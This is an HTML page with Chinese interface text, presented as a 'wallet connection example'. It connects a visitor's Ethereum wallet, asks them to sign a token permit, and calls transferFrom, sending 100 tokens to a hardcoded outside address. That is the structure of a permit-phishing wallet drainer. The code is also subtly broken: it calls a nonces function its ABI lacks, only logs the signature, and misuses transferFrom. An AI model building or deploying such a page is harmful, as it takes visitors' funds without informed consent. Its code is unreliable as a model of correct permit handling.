<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>连接钱包示例</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.9/dist/ethers.umd.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            color: #343a40;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            font-size: 16px;
        }
        button:disabled {
            background-color: #6c757d;
        }
        button:hover:not(:disabled) {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>钱包连接示例</h1>
        <button id="connectWalletBtn">连接钱包</button>
        <p id="status">状态: 未连接</p>
        <button id="signPermitBtn" disabled>签名授权</button>
        <button id="transferTokensBtn" disabled>转移代币</button>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            console.log("页面加载完成，初始化事件监听器...");

            let provider;
            let signer;
            let userAddress;
            let contract;

            const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3";  // 智能合约地址

            // 替换成你的实际合约 ABI
            const contractABI = [
                {
                    "inputs": [
                        { "internalType": "address", "name": "owner", "type": "address" },
                        { "internalType": "address", "name": "spender", "type": "address" },
                        { "internalType": "uint256", "name": "value", "type": "uint256" },
                        { "internalType": "uint256", "name": "nonce", "type": "uint256" },
                        { "internalType": "uint256", "name": "deadline", "type": "uint256" }
                    ],
                    "name": "permit",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                },
                {
                    "inputs": [
                        { "internalType": "address", "name": "from", "type": "address" },
                        { "internalType": "address", "name": "to", "type": "address" },
                        { "internalType": "uint256", "name": "value", "type": "uint256" }
                    ],
                    "name": "transferFrom",
                    "outputs": [
                        { "internalType": "bool", "name": "", "type": "bool" }
                    ],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ];

            // 连接钱包按钮点击事件
            document.getElementById('connectWalletBtn').addEventListener('click', async function () {
                console.log("连接钱包按钮被点击");
                try {
                    // 检查是否存在钱包扩展 (MetaMask 或其他)
                    if (typeof window.ethereum !== 'undefined') {
                        console.log('检测到钱包扩展，尝试连接...');

                        // 请求连接钱包
                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                        userAddress = accounts[0];

                        provider = new ethers.providers.Web3Provider(window.ethereum);
                        signer = provider.getSigner();

                        console.log("钱包已连接:", userAddress);
                        document.getElementById('status').textContent = "状态: 已连接 " + userAddress;

                        // 启用其他按钮
                        document.getElementById('signPermitBtn').disabled = false;
                        document.getElementById('transferTokensBtn').disabled = false;

                        // 实例化合约
                        contract = new ethers.Contract(contractAddress, contractABI, signer);
                    } else {
                        console.error("未检测到任何以太坊钱包扩展");
                        alert("未检测到任何以太坊钱包扩展，请安装MetaMask！");
                        document.getElementById('status').textContent = "状态: 未连接";
                    }
                } catch (error) {
                    console.error("连接钱包失败:", error);
                    alert("连接钱包失败，请检查浏览器扩展或重试。");
                    document.getElementById('status').textContent = "状态: 未连接";
                }
            });

            // 签名授权按钮点击事件
            document.getElementById('signPermitBtn').addEventListener('click', async function () {
                try {
                    if (!contract) {
                        alert("请先连接钱包！");
                        return;
                    }

                    const domain = {
                        name: 'MyToken',
                        version: '1',
                        chainId: 1,  // 根据你部署的网络进行修改
                        verifyingContract: contractAddress,
                    };

                    const permitData = {
                        owner: userAddress,
                        spender: '0xa465e2fc9f9d527AAEb07579E821D461F700e699',  // 收款地址
                        value: ethers.utils.parseUnits('100', 18),  // 转移金额
                        nonce: await contract.nonces(userAddress),
                        deadline: Math.floor(Date.now() / 1000) + 60 * 60,  // 一小时后过期
                    };

                    const types = {
                        Permit: [
                            { name: 'owner', type: 'address' },
                            { name: 'spender', type: 'address' },
                            { name: 'value', type: 'uint256' },
                            { name: 'nonce', type: 'uint256' },
                            { name: 'deadline', type: 'uint256' },
                        ],
                    };

                    const signature = await signer._signTypedData(domain, types, permitData);
                    const { v, r, s } = ethers.utils.splitSignature(signature);

                    console.log("签名成功:", { v, r, s });
                    alert("签名成功！");
                } catch (error) {
                    console.error("签名失败:", error);
                    alert("签名失败，请检查并重试。");
                }
            });

            // 转移代币按钮点击事件
            document.getElementById('transferTokensBtn').addEventListener('click', async function () {
                try {
                    if (!contract) {
                        alert("请先连接钱包！");
                        return;
                    }

                    const transferTx = await contract.transferFrom(
                        userAddress,
                        '0xa465e2fc9f9d527AAEb07579E821D461F700e699',  // 接收地址
                        ethers.utils.parseUnits('100', 18)  // 转移金额
                    );

                    console.log("代币转移交易已发送:", transferTx.hash);
                    alert("代币转移交易已成功发送！");
                } catch (error) {
                    console.error("代币转移失败:", error);
                    alert("代币转移失败，请检查并重试。");
                }
            });
        });
    </script>
</body>
</html>
